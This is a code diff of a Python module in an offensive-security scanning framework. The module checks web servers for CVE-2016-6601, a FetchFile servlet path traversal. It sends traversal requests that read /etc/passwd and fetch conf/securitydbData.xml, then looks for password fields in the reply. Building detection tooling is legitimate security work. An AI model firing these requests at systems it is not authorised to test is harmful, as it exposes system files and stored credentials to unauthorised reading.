@@ -1,23 +1,29 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""ZOHO WebNMS Framework before version 5."""
+"""Multiple vendors /servlets/FetchFile path traversal (CVE-2016-6601)."""
 
 import re
+
 from kittysploit import *
 from lib.protocols.http.http_client import Http_client
 
 
 class Module(Scanner, Http_client):
     __info__ = {
-        'name': 'ZOHO WebNMS Framework <5.2 SP1 - Local File Inclusion Detection',
-        'description': 'ZOHO WebNMS Framework before version 5.2 SP1 is vulnerable local file inclusion which allows an attacker to read arbitrary files via a .. (dot dot) in the fileName parameter to servlets/FetchFile.',
+        'name': 'FetchFile Servlet - Path Traversal Detection (CVE-2016-6601)',
+        'description': (
+            'Detects CVE-2016-6601 by reading /etc/passwd or conf/securitydbData.xml via '
+            '/servlets/FetchFile?fileName=.'
+        ),
         'author': ['KittySploit Team'],
         'severity': 'high',
-        'tags': ['web', 'scanner', 'cve', 'cve2016', 'edb', 'zoho', 'lfi', 'webnms', 'zohocorp', 'vuln'],
+        'tags': [
+            'web', 'scanner', 'cve', 'cve2016', 'lfi', 'unauth', 'vuln',
+        ],
         'agent': {
             'risk': 'active',
             'effects': ['network_probe'],
-            'expected_requests': 1,
+            'expected_requests': 2,
             'reversible': True,
             'approval_required': False,
             'produces': ['tech_hints', 'risk_signals', 'endpoints'],
@@ -25,55 +31,46 @@ class Module(Scanner, Http_client):
             'noise': 0.3,
             'value': 1.0,
             'requires': {
-                'min_endpoints': 0,
-                'min_params': 0,
-                'tech_hints_any': [],
-                'tech_hints_all': [],
-                'specializations_any': [],
-                'risk_signals_any': [],
-                'auth_session': False,
-                'capabilities_any': [],
-                'capabilities_all': [],
-                'confidence_min': {},
-                'confidence_min_any': {},
-                'endpoint_pattern_any': [],
-                'param_any': [],
-                'api_surface_ready': False,
+                'min_endpoints': 0, 'min_params': 0,
+                'tech_hints_any': [], 'tech_hints_all': [],
+                'specializations_any': [], 'risk_signals_any': [],
+                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
+                'confidence_min': {}, 'confidence_min_any': {},
+                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
             },
             'chain': {
-                'produces_capabilities': [
-                    {
-                        'capability': 'admin_surface',
-                        'from_detail': '',
-                    },
-                ],
+                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                 'consumes_capabilities': [],
                 'option_bindings': {},
-                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
+                'suggested_followups': ['scanner/http/securitydbdata_xml_disclosure_detect'],
             },
         },
-        'references': [
-            'https://github.com/pedrib/PoC/blob/master/advisories/webnms-5.2-sp1-pwn.txt',
-            'https://www.exploit-db.com/exploits/40229/',
-            'https://nvd.nist.gov/vuln/detail/CVE-2016-6601',
-            'http://www.rapid7.com/db/modules/auxiliary/admin/http/webnms_cred_disclosure',
-            'http://www.rapid7.com/db/modules/auxiliary/admin/http/webnms_file_download',
-        ],
+        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2016-6601'],
         'cve': 'CVE-2016-6601',
     }
 
     def run(self):
-        r = self.http_request(method="GET", path='/servlets/FetchFile?fileName=../../../etc/passwd', allow_redirects=False)
-        if not r or r.status_code != 200:
+        probe = self.http_request(method='GET', path='/servlets/FetchFile', allow_redirects=False)
+        if not probe or probe.status_code >= 300:
             return False
-        body = r.text or ""
-        body_regexes = ('root:.*:0:0',)
-        if (any(re.search(rx, body, 0) for rx in body_regexes)):
+        path = '/servlets/FetchFile?fileName=../../../../../../../etc/passwd'
+        r = self.http_request(method='GET', path=path, allow_redirects=False)
+        if r and re.search(r'root:.*:0:0:', r.text or ''):
             self.set_info(
                 severity='high',
-                reason="ZOHO WebNMS Framework <5.2 SP1 - Local File Inclusion detected",
-                path='/servlets/FetchFile?fileName=../../../etc/passwd',
+                reason='FetchFile path traversal (CVE-2016-6601)',
+                path='/servlets/FetchFile',
             )
             return True
+        path2 = '/servlets/FetchFile?fileName=conf/securitydbData.xml'
+        r2 = self.http_request(method='GET', path=path2, allow_redirects=False)
+        if r2:
+            body = r2.text or ''
+            if '<AUTHORIZATION-DATA>' in body and '<DATA ownername=' in body and 'password=' in body:
+                self.set_info(
+                    severity='high',
+                    reason='FetchFile securitydbData.xml disclosure',
+                    path=path2,
+                )
+                return True
         return False
-
